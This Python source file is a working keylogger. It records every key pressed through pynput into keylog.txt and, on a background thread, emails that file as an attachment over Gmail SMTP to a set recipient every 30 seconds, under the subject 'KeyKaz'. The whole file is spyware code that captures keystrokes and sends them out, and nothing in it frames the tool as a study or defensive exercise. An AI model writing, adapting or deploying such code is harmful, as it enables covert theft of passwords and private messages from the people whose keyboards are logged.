from pynput import keyboard
import smtplib
import time
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def KeyPressed(key):
    print(str(key))
    with open("keylog.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting chat")

def send_email():
# Email account details
    sender_email = "your_email@example.com"
    sender_password = "your_password"  # Please don't hardcode passwords in real-world applications, use environment variables or other secure methods instead
    receiver_email = "recipient@example.com"

    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "KeyKaz"

    # Attach file
    filename = "keylog.txt"
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {filename}')
    msg.attach(part)
    attachment.close()

    # Connect to SMTP server and send email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

def email_sender_thread():
    while True:
        send_email()
        print("Email sent")
        time.sleep(30)  # Sleep for 5 minutes (300 seconds)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    threading.Thread(target=email_sender_thread).start()
    listener.join()  # This line keeps the main thread alive while the keyboard listener is running
